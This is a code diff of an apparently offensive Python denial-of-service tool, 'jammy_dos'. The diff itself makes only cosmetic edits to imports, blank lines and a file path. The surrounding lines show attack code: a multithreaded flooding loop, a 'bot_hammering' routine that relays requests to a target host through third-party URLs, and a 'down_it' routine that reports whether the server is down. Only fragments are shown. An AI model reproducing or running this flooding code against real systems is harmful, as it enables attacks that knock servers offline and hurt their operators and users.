@@ -13,10 +13,8 @@ def jammy_dos(ip, port=80, turbo=200):
         if input_id == correct_id:
             print("\033[92m Login successful!")
 
-            from colorama import Fore, Back, Style
             from queue import Queue
-            from optparse import OptionParser
-            import time, sys, socket, threading, logging, urllib.request, random
+            import time, socket, threading, urllib.request, random
 
             print(f"""{RED}
     __________________________________________________________________________________                         
@@ -484,7 +482,6 @@ def jammy_dos(ip, port=80, turbo=200):
 
                 return (uagent)
 
-
             def my_bots():
                 global bots
                 bots = []
@@ -535,7 +532,6 @@ def jammy_dos(ip, port=80, turbo=200):
 
                 return (bots)
 
-
             def bot_hammering(url):
                 try:
                     while True:
@@ -544,7 +540,6 @@ def jammy_dos(ip, port=80, turbo=200):
                         time.sleep(.1)
                 except:
                     time.sleep(.1)
-
 
             def down_it(item):
                 try:
@@ -567,13 +562,11 @@ def jammy_dos(ip, port=80, turbo=200):
                     print("\033[91mNo connection! Server down?\033[0m")
                     time.sleep(.1)
 
-
             def dos():
                 while True:
                     item = q.get()
                     down_it(item)
                     q.task_done()
-
 
             def dos2():
                 while True:
@@ -581,20 +574,14 @@ def jammy_dos(ip, port=80, turbo=200):
                     bot_hammering(random.choice(bots) + "http://" + host)
                     w.task_done()
 
-            
-                
-
-
             # reading headers
             global data
-            headers = open("tools/headers.txt", "r")
+            headers = open("JammyTools/headers.txt", "r")
             data = headers.read()
             headers.close()
             # task queue are q,w
             q = Queue()
             w = Queue()
-
-
 
             host = ip
             port = port
